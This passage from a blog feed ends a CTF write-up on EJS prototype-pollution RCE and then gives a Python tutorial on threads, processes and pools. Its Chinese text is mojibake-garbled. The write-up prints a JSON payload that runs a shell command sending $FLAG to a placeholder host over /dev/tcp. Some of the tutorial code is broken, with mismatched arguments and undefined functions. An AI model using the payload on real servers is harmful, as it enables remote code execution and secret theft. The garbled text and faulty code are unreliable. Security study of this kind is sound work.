class="property">localsName</span> + <span class="string">&#x27;, escapeFn, include, rethrow&#x27;</span>, src);</span><br><span class="line"><span class="comment">// Return a callable function which will execute the function</span></span><br></pre></td></tr></table></figure>


<p>è¿™æ®µä»£ç çš„æ„æ€ä¾¿æ˜¯ï¼Œ<code>opt.outputFunctionName</code>ä¼šè¢«ä½œä¸ºå­—ç¬¦ä¸²æ‹¼æ¥åˆ°<code>prepended</code>ä¸­ï¼Œç„¶ååˆ°<code>src</code>ã€<code>fn</code>æœ€ç»ˆä½œä¸ºä»£ç æ‰§è¡Œã€‚è€Œä¸”<code>opt.outputFunctionName</code>è¿™ä¸ªæˆå‘˜åœ¨å‡½æ•°çš„ä¸Šä¸‹æ–‡ä¸­å®Œå…¨æ²¡æœ‰å‡ºç°è¿‡ï¼Œä¹Ÿå°±æ˜¯<code>undefined</code>é‚£ä¹ˆæˆ‘ä»¬é€šè¿‡ç»™<code>Object.prototype</code>åŠ ä¸Šè¿™ä¸€å±æ€§ï¼Œå°±å¯ä»¥è¾¾åˆ°RCEçš„æ•ˆæœäº†</p>
<p>payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;test&quot;</span><span class="punctuation">,</span><span class="attr">&quot;content&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;outputFunctionName&quot;</span><span class="punctuation">:</span><span class="string">&quot;a=1;process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;b</span></span><br><span class="line"><span class="string">ash -c \&quot;echo $FLAG&gt;/dev/tcp/xxxxx/xx\&quot;&#x27;)//&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>


<p>å‘<code>/add</code>æ¥å£POST 6æ¬¡ï¼Œç„¶åå†è®¿é—®ä¸€æ¬¡<code>/get</code>ï¼Œå†è®¿é—®<code>/</code>æˆ–<code>/login</code>è§¦å‘<code>render()</code>å‡½æ•°å³å¯</p>
<p>FLAGåœ¨ç¯å¢ƒå˜é‡ä¸­</p>
]]></content>
      <categories>
        <category>Webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>contaminate</tag>
      </tags>
  </entry>
  <entry>
    <title>å¤šè¿›ç¨‹ã€è¿›ç¨‹æ± ã€å¼‚æ­¥å¤§æ€»ç»“</title>
    <url>/%E7%9F%A5%E8%AF%86%E6%A0%91/%E5%A4%9A%E8%BF%9B%E7%A8%8B%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%BC%82%E6%AD%A5/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a><center>å‰è¨€</center></h1><p>ç»å¸¸å†™è„šæœ¬ä¸å·¥å…·ï¼Œè¶Šå‘æ„Ÿè§‰åˆ°é€Ÿåº¦çš„é‡è¦æ€§ï¼æœ¬æ–‡ä»åŸºç¡€å¼€å§‹ï¼ŒåŸºäºPythonè®²è§£ï¼Œé€‚åˆå°ç™½é˜…è¯»ï¼Œä½†éœ€è¦ä¸€å®šä»£ç åŠŸåº•ã€‚</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownrxesbPFqSN2uTp3.jpg"></p>
<span id="more"></span>

<h1 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a><center>æ­£æ–‡</center></h1><p>åœ¨æ­£å¼è¿›å…¥å­¦ä¹ ä¹‹å‰ï¼Œå…ˆè¦äº†è§£ä¸€å®šçš„åŸºç¡€çŸ¥è¯†ã€‚</p>
<h2 id="1-1-é˜»å¡"><a href="#1-1-é˜»å¡" class="headerlink" title="1.1 é˜»å¡"></a>1.1 é˜»å¡</h2><ul>
<li>ç¨‹åºæœªå¾—åˆ°æ‰€éœ€è®¡ç®—èµ„æºæ—¶è¢«æŒ‚èµ·çš„çŠ¶æ€ã€‚</li>
<li><strong>ç¨‹åºåœ¨ç­‰å¾…æŸä¸ªæ“ä½œå®ŒæˆæœŸé—´ï¼Œè‡ªèº«æ— æ³•ç»§ç»­å¹²åˆ«çš„äº‹æƒ…ï¼Œåˆ™ç§°è¯¥ç¨‹åºåœ¨è¯¥æ“ä½œä¸Šæ˜¯é˜»å¡çš„****ã€‚</strong></li>
<li>å¸¸è§çš„é˜»å¡å½¢å¼æœ‰ï¼š<code>ç½‘ç»œI/Oé˜»å¡</code>ã€<code>ç£ç›˜I/Oé˜»å¡</code>ã€<code>ç”¨æˆ·è¾“å…¥é˜»å¡</code><strong>ç­‰</strong>ã€‚</li>
</ul>
<p>é˜»å¡æ˜¯æ— å¤„ä¸åœ¨çš„ï¼ŒåŒ…æ‹¬CPUåˆ‡æ¢ä¸Šä¸‹æ–‡æ—¶ï¼Œæ‰€æœ‰çš„è¿›ç¨‹éƒ½æ— æ³•çœŸæ­£å¹²äº‹æƒ…ï¼Œå®ƒä»¬ä¹Ÿä¼šè¢«é˜»å¡ã€‚ï¼ˆå¦‚æœæ˜¯å¤šæ ¸CPUåˆ™æ­£åœ¨æ‰§è¡Œä¸Šä¸‹æ–‡åˆ‡æ¢æ“ä½œçš„æ ¸ä¸å¯è¢«åˆ©ç”¨ï¼‰</p>
<h2 id="1-2-éé˜»å¡"><a href="#1-2-éé˜»å¡" class="headerlink" title="1.2 éé˜»å¡"></a>1.2 éé˜»å¡</h2><ul>
<li><strong>ç¨‹åºåœ¨ç­‰å¾…æŸæ“ä½œè¿‡ç¨‹ä¸­ï¼Œè‡ªèº«ä¸è¢«é˜»å¡ï¼Œå¯ä»¥ç»§ç»­è¿è¡Œå¹²åˆ«çš„äº‹æƒ…ï¼Œåˆ™ç§°è¯¥ç¨‹åºåœ¨è¯¥æ“ä½œä¸Šæ˜¯éé˜»å¡çš„ã€‚</strong></li>
<li>éé˜»å¡å¹¶<code>ä¸æ˜¯</code>åœ¨ä»»ä½•ç¨‹åºçº§åˆ«ã€ä»»ä½•æƒ…å†µä¸‹éƒ½å¯ä»¥å­˜åœ¨çš„ã€‚</li>
<li>ä»…å½“ç¨‹åºå°è£…çš„çº§åˆ«å¯ä»¥å›Šæ‹¬ç‹¬ç«‹çš„å­ç¨‹åºå•å…ƒæ—¶ï¼Œå®ƒæ‰å¯èƒ½å­˜åœ¨éé˜»å¡çŠ¶æ€ã€‚</li>
</ul>
<p>éé˜»å¡çš„å­˜åœ¨æ˜¯å› ä¸ºé˜»å¡å­˜åœ¨ï¼Œæ­£å› ä¸ºæŸä¸ªæ“ä½œé˜»å¡å¯¼è‡´çš„è€—æ—¶ä¸æ•ˆç‡ä½ä¸‹ï¼Œæˆ‘ä»¬æ‰è¦æŠŠå®ƒå˜æˆéé˜»å¡çš„ã€‚</p>
<h2 id="1-3-åŒæ­¥"><a href="#1-3-åŒæ­¥" class="headerlink" title="1.3 åŒæ­¥"></a>1.3 åŒæ­¥</h2><ul>
<li>ä¸åŒç¨‹åºå•å…ƒä¸ºäº†å®ŒæˆæŸä¸ªä»»åŠ¡ï¼Œåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­éœ€é æŸç§é€šä¿¡æ–¹å¼ä»¥<strong>åè°ƒä¸€è‡´</strong>ï¼Œç§°è¿™äº›ç¨‹åºå•å…ƒæ˜¯åŒæ­¥æ‰§è¡Œçš„ã€‚</li>
<li>ä¾‹å¦‚è´­ç‰©ç³»ç»Ÿä¸­æ›´æ–°å•†å“åº“å­˜ï¼Œéœ€è¦ç”¨â€œè¡Œé”â€ä½œä¸ºé€šä¿¡ä¿¡å·ï¼Œè®©ä¸åŒçš„æ›´æ–°è¯·æ±‚å¼ºåˆ¶æ’é˜Ÿé¡ºåºæ‰§è¡Œï¼Œé‚£æ›´æ–°åº“å­˜çš„æ“ä½œæ˜¯åŒæ­¥çš„ã€‚</li>
<li>ç®€è¨€ä¹‹ï¼Œ<strong>åŒæ­¥æ„å‘³ç€æœ‰åº</strong>ã€‚</li>
</ul>
<h2 id="1-4-å¼‚æ­¥"><a href="#1-4-å¼‚æ­¥" class="headerlink" title="1.4 å¼‚æ­¥"></a>1.4 å¼‚æ­¥</h2><ul>
<li>ä¸ºå®ŒæˆæŸä¸ªä»»åŠ¡ï¼Œä¸åŒç¨‹åºå•å…ƒä¹‹é—´<strong>è¿‡ç¨‹ä¸­æ— éœ€é€šä¿¡åè°ƒ</strong>ï¼Œä¹Ÿèƒ½å®Œæˆä»»åŠ¡çš„æ–¹å¼ã€‚</li>
<li>ä¸ç›¸å…³çš„ç¨‹åºå•å…ƒä¹‹é—´å¯ä»¥æ˜¯å¼‚æ­¥çš„ã€‚</li>
<li>ä¾‹å¦‚ï¼Œçˆ¬è™«ä¸‹è½½ç½‘é¡µã€‚è°ƒåº¦ç¨‹åºè°ƒç”¨ä¸‹è½½ç¨‹åºåï¼Œå³å¯è°ƒåº¦å…¶ä»–ä»»åŠ¡ï¼Œè€Œæ— éœ€ä¸è¯¥ä¸‹è½½ä»»åŠ¡ä¿æŒé€šä¿¡ä»¥åè°ƒè¡Œä¸ºã€‚ä¸åŒç½‘é¡µçš„ä¸‹è½½ã€ä¿å­˜ç­‰æ“ä½œéƒ½æ˜¯æ— å…³çš„ï¼Œä¹Ÿæ— éœ€ç›¸äº’é€šçŸ¥åè°ƒã€‚è¿™äº›å¼‚æ­¥æ“ä½œçš„å®Œæˆæ—¶åˆ»å¹¶ä¸ç¡®å®šã€‚</li>
<li>ç®€è¨€ä¹‹ï¼Œ<strong>å¼‚æ­¥æ„å‘³ç€æ— åº</strong>ã€‚</li>
</ul>
<p>ä¸Šæ–‡æåˆ°çš„<code>â€œé€šä¿¡æ–¹å¼â€</code>é€šå¸¸æ˜¯æŒ‡å¼‚æ­¥å’Œå¹¶å‘ç¼–ç¨‹æä¾›çš„<code>åŒæ­¥åŸè¯­</code>ï¼Œå¦‚<code>ä¿¡å·é‡</code>ã€<code>é”</code>ã€<code>åŒæ­¥é˜Ÿåˆ—</code>ç­‰ç­‰ã€‚æˆ‘ä»¬éœ€çŸ¥é“ï¼Œè™½ç„¶è¿™äº›é€šä¿¡æ–¹å¼æ˜¯ä¸ºäº†è®©å¤šä¸ªç¨‹åºåœ¨ä¸€å®šæ¡ä»¶ä¸‹åŒæ­¥æ‰§è¡Œï¼Œä½†æ­£å› ä¸ºæ˜¯å¼‚æ­¥çš„å­˜åœ¨ï¼Œæ‰éœ€è¦è¿™äº›é€šä¿¡æ–¹å¼ã€‚å¦‚æœæ‰€æœ‰ç¨‹åºéƒ½æ˜¯æŒ‰åºæ‰§è¡Œï¼Œå…¶æœ¬èº«å°±æ˜¯åŒæ­¥çš„ï¼Œåˆä½•éœ€è¿™äº›åŒæ­¥ä¿¡å·å‘¢ï¼Ÿ</p>
<h2 id="1-5-å¹¶å‘"><a href="#1-5-å¹¶å‘" class="headerlink" title="1.5 å¹¶å‘"></a>1.5 å¹¶å‘</h2><ul>
<li>å¹¶å‘æè¿°çš„æ˜¯ç¨‹åºçš„ç»„ç»‡ç»“æ„ã€‚æŒ‡ç¨‹åºè¦è¢«è®¾è®¡æˆå¤šä¸ªå¯ç‹¬ç«‹æ‰§è¡Œçš„å­ä»»åŠ¡ã€‚</li>
<li><strong>ä»¥åˆ©ç”¨æœ‰é™çš„è®¡ç®—æœºèµ„æºä½¿å¤šä¸ªä»»åŠ¡å¯ä»¥è¢«å®æ—¶æˆ–è¿‘å®æ—¶æ‰§è¡Œä¸ºç›®çš„ã€‚</strong></li>
</ul>
<h2 id="1-6-å¹¶è¡Œ"><a href="#1-6-å¹¶è¡Œ" class="headerlink" title="1.6 å¹¶è¡Œ"></a>1.6 å¹¶è¡Œ</h2><ul>
<li>å¹¶è¡Œæè¿°çš„æ˜¯ç¨‹åºçš„æ‰§è¡ŒçŠ¶æ€ã€‚æŒ‡å¤šä¸ªä»»åŠ¡åŒæ—¶è¢«æ‰§è¡Œã€‚</li>
<li><strong>ä»¥åˆ©ç”¨å¯Œä½™è®¡ç®—èµ„æºï¼ˆå¤šæ ¸CPUï¼‰åŠ é€Ÿå®Œæˆå¤šä¸ªä»»åŠ¡ä¸ºç›®çš„ã€‚</strong></li>
</ul>
<p>å¹¶å‘æä¾›äº†ä¸€ç§ç¨‹åºç»„ç»‡ç»“æ„æ–¹å¼ï¼Œè®©é—®é¢˜çš„è§£å†³æ–¹æ¡ˆå¯ä»¥å¹¶è¡Œæ‰§è¡Œï¼Œä½†å¹¶è¡Œæ‰§è¡Œä¸æ˜¯å¿…é¡»çš„ã€‚</p>
<h2 id="1-7-æ¦‚å¿µæ€»ç»“"><a href="#1-7-æ¦‚å¿µæ€»ç»“" class="headerlink" title="1.7 æ¦‚å¿µæ€»ç»“"></a>1.7 æ¦‚å¿µæ€»ç»“</h2><ul>
<li><code>**å¹¶è¡Œ**</code>æ˜¯ä¸ºäº†åˆ©ç”¨å¤šæ ¸åŠ é€Ÿå¤šä»»åŠ¡å®Œæˆçš„è¿›åº¦</li>
<li><code>**å¹¶å‘**</code>æ˜¯ä¸ºäº†è®©ç‹¬ç«‹çš„å­ä»»åŠ¡éƒ½æœ‰æœºä¼šè¢«å°½å¿«æ‰§è¡Œï¼Œä½†ä¸ä¸€å®šèƒ½åŠ é€Ÿæ•´ä½“è¿›åº¦</li>
<li><code>**éé˜»å¡**</code>æ˜¯ä¸ºäº†æé«˜ç¨‹åºæ•´ä½“æ‰§è¡Œæ•ˆç‡</li>
<li><code>**å¼‚æ­¥**</code>æ˜¯é«˜æ•ˆåœ°ç»„ç»‡éé˜»å¡ä»»åŠ¡çš„æ–¹å¼</li>
</ul>
<h2 id="1-8-å…¨å±€è§£é‡Šå™¨é”"><a href="#1-8-å…¨å±€è§£é‡Šå™¨é”" class="headerlink" title="1.8 å…¨å±€è§£é‡Šå™¨é”"></a>1.8 å…¨å±€è§£é‡Šå™¨é”</h2><ul>
<li>CPython åœ¨è§£é‡Šå™¨è¿›ç¨‹çº§åˆ«æœ‰ä¸€æŠŠé”ï¼Œå«åšGILï¼Œå³å…¨å±€è§£é‡Šå™¨é”ã€‚</li>
<li>GIL ä¿è¯CPythonè¿›ç¨‹ä¸­ï¼Œåªæœ‰ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œå­—èŠ‚ç ã€‚ç”šè‡³æ˜¯åœ¨å¤šæ ¸CPUçš„æƒ…å†µä¸‹ï¼Œä¹Ÿåªå…è®¸åŒæ—¶åªèƒ½æœ‰ä¸€ä¸ªCPU ä¸Šè¿è¡Œè¯¥è¿›ç¨‹çš„ä¸€ä¸ªçº¿ç¨‹ã€‚</li>
<li>CPythonä¸­<ol>
<li><strong>IOå¯†é›†å‹</strong>ï¼ŒæŸä¸ªçº¿ç¨‹é˜»å¡ï¼Œå°±ä¼šè°ƒåº¦å…¶ä»–å°±ç»ªçº¿ç¨‹ï¼›</li>
<li><strong>CPUå¯†é›†å‹</strong>ï¼Œå½“å‰çº¿ç¨‹å¯èƒ½ä¼šè¿ç»­çš„è·å¾—GILï¼Œå¯¼è‡´å…¶å®ƒçº¿ç¨‹å‡ ä¹æ— æ³•ä½¿ç”¨CPUã€‚</li>
</ol>
</li>
<li>åœ¨CPythonä¸­ç”±äºæœ‰GILå­˜åœ¨ï¼ŒIOå¯†é›†å‹ï¼Œä½¿ç”¨å¤šçº¿ç¨‹è¾ƒä¸ºåˆç®—ï¼›CPUå¯†é›†å‹ï¼Œä½¿ç”¨å¤šè¿›ç¨‹ï¼Œè¦ç»•å¼€GILã€‚</li>
</ul>
<p>è¦æ”¯æŒå¹¶å‘ï¼Œå¿…é¡»æ‹†åˆ†ä¸ºå¤šä»»åŠ¡ï¼Œä¸åŒä»»åŠ¡ç›¸å¯¹è€Œè¨€æ‰æœ‰é˜»å¡&#x2F;éé˜»å¡ã€åŒæ­¥&#x2F;å¼‚æ­¥ã€‚æ‰€ä»¥ï¼Œå¹¶å‘ã€å¼‚æ­¥ã€éé˜»å¡ä¸‰ä¸ªè¯æ€»æ˜¯å¦‚å½±éšå½¢ã€‚</p>
<h1 id="å¤šçº¿ç¨‹"><a href="#å¤šçº¿ç¨‹" class="headerlink" title="å¤šçº¿ç¨‹"></a><center>å¤šçº¿ç¨‹</center></h1><p>äº†è§£ä»¥ä¸Šå†…å®¹ï¼Œå°±å¯ä»¥æ¥çœ‹å¤šçº¿ç¨‹äº†ï¼Œæ ‡é¢˜æ˜æ˜æ²¡æœ‰å¤šçº¿ç¨‹æˆ‘ä¸ºä»€ä¹ˆè¿˜è¦è®²å¤šçº¿ç¨‹å‘¢ï¼Ÿ</p>
<p>Pythonå› ä¸º<code>GILï¼ˆå…¨å±€è§£é‡Šå™¨é”ï¼‰</code>çš„å­˜åœ¨ï¼ŒPythonçš„å¤šçº¿ç¨‹å¹¶ä¸æ˜¯çœŸæ­£çš„å¤šçº¿ç¨‹ï¼Œä½†æ˜¯åœ¨åŒæ­¥ä¸é˜»å¡çš„æƒ…å†µä¸‹ï¼Œå´å¯ä»¥å‘æŒ¥å‡ºå¤šçº¿ç¨‹çš„æ•ˆæœï¼Œæ— æ³•åšåˆ°å¼‚æ­¥ï¼Œä½†æ˜¯å¯ä»¥æ¨èäº†è§£ä¸€ä¸‹ï¼Œäº†è§£ä¹‹åå¯ä»¥æ›´æ–¹ä¾¿å­¦ä¹ å¤šè¿›ç¨‹ã€‚</p>
<h2 id="çº¿ç¨‹çš„åŸºæœ¬æ¦‚å¿µ"><a href="#çº¿ç¨‹çš„åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="çº¿ç¨‹çš„åŸºæœ¬æ¦‚å¿µ"></a>çº¿ç¨‹çš„åŸºæœ¬æ¦‚å¿µ</h2><p><code>çº¿ç¨‹</code>æ˜¯æŒ‡è¿›ç¨‹å†…çš„ä¸€ä¸ªæ‰§è¡Œå•å…ƒ,ä¹Ÿæ˜¯è¿›ç¨‹å†…çš„å¯è°ƒåº¦å®ä½“ã€‚</p>
<p><font color="red"><strong>ä¸€ä¸ªè¿›ç¨‹å¯ä»¥æ‹¥æœ‰å¤šä¸ªçº¿ç¨‹ã€‚</strong></font></p>
<p>ä¸è¿›ç¨‹çš„åŒºåˆ«:  </p>
<ul>
<li><p>åœ°å€ç©ºé—´:è¿›ç¨‹å†…çš„ä¸€ä¸ªæ‰§è¡Œå•å…ƒ;è¿›ç¨‹è‡³å°‘æœ‰ä¸€ä¸ªçº¿ç¨‹;å®ƒä»¬å…±äº«è¿›ç¨‹çš„åœ°å€ç©ºé—´;è€Œè¿›ç¨‹æœ‰è‡ªå·±ç‹¬ç«‹çš„åœ°å€ç©ºé—´ï¼› </p>
</li>
<li><p>èµ„æºæ‹¥æœ‰:è¿›ç¨‹æ˜¯èµ„æºåˆ†é…å’Œæ‹¥æœ‰çš„å•ä½,åŒä¸€ä¸ªè¿›ç¨‹å†…çš„çº¿ç¨‹å…±äº«è¿›ç¨‹çš„èµ„æºï¼›</p>
</li>
<li><p>çº¿ç¨‹æ˜¯å¤„ç†å™¨è°ƒåº¦çš„åŸºæœ¬å•ä½,ä½†è¿›ç¨‹ä¸æ˜¯ï¼›</p>
</li>
<li><p>äºŒè€…å‡å¯å¹¶å‘æ‰§è¡Œã€‚</p>
</li>
</ul>
<p>ç®€è€Œè¨€ä¹‹,<font color="red"><strong>ä¸€ä¸ªç¨‹åºè‡³å°‘æœ‰ä¸€ä¸ªè¿›ç¨‹,ä¸€ä¸ªè¿›ç¨‹è‡³å°‘æœ‰ä¸€ä¸ªçº¿ç¨‹</strong></font>ã€‚</p>
<p>çº¿ç¨‹çš„åˆ’åˆ†å°ºåº¦å°äºè¿›ç¨‹ï¼Œä½¿å¾—å¤šçº¿ç¨‹ç¨‹åºçš„å¹¶å‘æ€§é«˜ã€‚<br>å¦å¤–ï¼Œè¿›ç¨‹åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­æ‹¥æœ‰ç‹¬ç«‹çš„å†…å­˜å•å…ƒï¼Œè€Œå¤šä¸ªçº¿ç¨‹å…±äº«å†…å­˜ï¼Œä»è€Œæå¤§åœ°æé«˜äº†ç¨‹åºçš„è¿è¡Œæ•ˆç‡ã€‚</p>
<h2 id="threadingã€queue"><a href="#threadingã€queue" class="headerlink" title="threadingã€queue"></a>threadingã€queue</h2><p>Pythonå®ç°å¤šçº¿ç¨‹ä¸»è¦ç”¨threadingæ¨¡å—ï¼Œçº¿ç¨‹åŒæ­¥åˆ™æ˜¯ç”¨queueæ¨¡å—å®ç°ã€‚</p>
<p>çº¿ç¨‹åŒæ­¥æœ‰4ç§å®ç°æ–¹å¼ï¼š</p>
<ul>
<li>é”æœºåˆ¶</li>
<li>ä¿¡å·é‡</li>
<li>æ¡ä»¶åˆ¤æ–­</li>
<li>åŒæ­¥é˜Ÿåˆ—</li>
</ul>
<p>queueæ¨¡å—å†…éƒ¨å°è£…äº†é”åŸè¯­ï¼Œä½¿ç”¨å…ˆè¿›å…ˆå‡ºé˜Ÿåˆ—çš„æ—¶å€™ä½¿ç”¨äº’æ–¥é”ã€‚</p>
<p>ä¸‹é¢ç”¨è¿™ä¸ªä¾‹å­è®²è§£ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">q</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:  <span class="comment"># æ‰“å¼€æ–‡ä»¶</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">            line = line.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            q.put(line)</span><br><span class="line">            <span class="built_in">print</span>(line)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">resp</span>(<span class="params">q</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s = q.get()</span><br><span class="line">        s += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> q.empty():</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;dir.txt&quot;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">                f.writelines(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    q = queue.Queue()</span><br><span class="line">    threadings = []</span><br><span class="line"></span><br><span class="line">    t1 = threading.Thread(target=read, args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line">    threadings.append(t1)</span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threadings:</span><br><span class="line">        thread.join()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        t2 = threading.Thread(target=resp, args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line">        threadings.append(t2)</span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threadings:</span><br><span class="line">        thread.join()</span><br></pre></td></tr></table></figure>

<p>ä»£ç ç¬¬26è¡Œå®ä¾‹åŒ–äº†ä¸€ä¸ªå…ˆè¿›å…ˆå‡ºçš„queueé˜Ÿåˆ—ï¼Œ27è¡Œåˆ›å»ºä¸€ä¸ªçº¿ç¨‹æ± ã€‚</p>
<p><code>t1</code>æ˜¯ç¬¬ä¸€ä¸ªçº¿ç¨‹ï¼ŒtargetæŒ‡å‘æ–¹æ³•ï¼ŒatgsæŒ‡å‘ä¼ å€¼ï¼Œqåé¢å¿…é¡»åŠ é€—å·ã€‚</p>
<p>31-33è¡Œï¼ŒæŠŠt1æ·»åŠ åˆ°çº¿ç¨‹æ± ï¼Œç­‰ä»–å¾ªç¯å®Œï¼Œå°±é˜»å¡ã€‚</p>
<h1 id="å¤šè¿›ç¨‹"><a href="#å¤šè¿›ç¨‹" class="headerlink" title="å¤šè¿›ç¨‹"></a><center>å¤šè¿›ç¨‹</center></h1><p>Pythonä¸­çš„å¤šçº¿ç¨‹æ— æ³•åˆ©ç”¨å¤šæ ¸ä¼˜åŠ¿ï¼Œå¦‚æœæƒ³è¦<code>å……åˆ†åœ°ä½¿ç”¨å¤šæ ¸CPUçš„èµ„æº</code>ï¼Œåœ¨pythonä¸­å¤§éƒ¨åˆ†æƒ…å†µéœ€è¦ä½¿ç”¨å¤šè¿›ç¨‹ã€‚</p>
<h2 id="multiprocessing"><a href="#multiprocessing" class="headerlink" title="multiprocessing"></a>multiprocessing</h2><p>Pythonå®ç°å¤šè¿›ç¨‹ä¸»è¦ä¾é <code>multiprocessingæ¨¡å—</code>å®ç°.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br></pre></td></tr></table></figure>

<p><code>multiprocessing</code>æ¨¡å—ç”¨æ¥å¼€å¯å­è¿›ç¨‹ï¼Œå¹¶åœ¨å­è¿›ç¨‹ä¸­æ‰§è¡Œæˆ‘ä»¬å®šåˆ¶çš„ä»»åŠ¡ï¼ˆæ¯”å¦‚å‡½æ•°ï¼‰</p>
<p><code>multiprocessing</code>æ¨¡å—çš„åŠŸèƒ½ä¼—å¤šï¼šæ”¯æŒå­è¿›ç¨‹ã€<strong>é€šä¿¡å’Œå…±äº«æ•°æ®</strong>ã€æ‰§è¡Œä¸åŒå½¢å¼çš„åŒæ­¥ï¼Œæä¾›äº†<code>Processã€Queueã€Pipeã€Lock</code>ç­‰ç»„ä»¶ã€‚</p>
<p><font color="red"><strong>ä¸çº¿ç¨‹ä¸åŒï¼Œè¿›ç¨‹æ²¡æœ‰ä»»ä½•å…±äº«çŠ¶æ€ï¼Œè¿›ç¨‹ä¿®æ”¹çš„æ•°æ®ï¼Œæ”¹åŠ¨ä»…é™äºè¯¥è¿›ç¨‹å†…</strong></font></p>
<p>å†™æ³•ä¸çº¿ç¨‹ç±»æ­»ï¼Œä½†æ˜¯<font color="red"><strong>è¿›ç¨‹ç±»å¿…é¡»åœ¨main()å†…</strong></font>,ä½¿ç”¨é˜Ÿåˆ—ä¹Ÿå¿…é¡»æ˜¯multiprocessingå†…çš„é˜Ÿåˆ—ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, Queue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">text1</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;çº¿ç¨‹å¯åŠ¨äº†&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    q = Queue()</span><br><span class="line">    p1 = Process(target=text1, args=(q,))</span><br><span class="line">    p1.start()</span><br><span class="line">    p1.join()</span><br></pre></td></tr></table></figure>

<p><font color="red"><strong>æœ‰ä¸¤ç§å¯åŠ¨æ–¹å¼ï¼Œå¤šçº¿ç¨‹å¿…é¡»ç”¨.start()ï¼Œå¦‚æœç”¨.run()å°±é™çº§ä¸ºå•è¿›ç¨‹äº†ã€‚</strong></font></p>
<h1 id="è¿›ç¨‹æ± "><a href="#è¿›ç¨‹æ± " class="headerlink" title="è¿›ç¨‹æ± "></a><center>è¿›ç¨‹æ± </center></h1><p>ä¸»è¦ç”¨multiprocessingä¸­çš„Poolå®ç°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br></pre></td></tr></table></figure>

<p>ä¾‹å­</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, Pool, Pipe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    q = Pipe</span><br><span class="line">    <span class="comment"># 100ä¸ªä»»åŠ¡</span></span><br><span class="line">    data = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">100</span>))</span><br><span class="line">    <span class="comment"># è¿›ç¨‹æ± å¤§å°</span></span><br><span class="line">    pool = Pool(processes=<span class="number">4</span>)</span><br><span class="line">    <span class="comment"># ä¸€ä¸ªä¸€ä¸ªæäº¤</span></span><br><span class="line">    <span class="comment"># pool_out_puts = pool.apply(index_pool,(q,))</span></span><br><span class="line">    <span class="comment"># ä¸€æ¬¡æ€§å¤§é‡æäº¤</span></span><br><span class="line">    pool_out_puts = pool.<span class="built_in">map</span>(index_pool, (q,))</span><br><span class="line">    pool.close()<span class="comment"># å…³é—­è¿›ç¨‹</span></span><br><span class="line">    pool.join()<span class="comment"># é˜»å¡è¿›ç¨‹</span></span><br></pre></td></tr></table></figure>

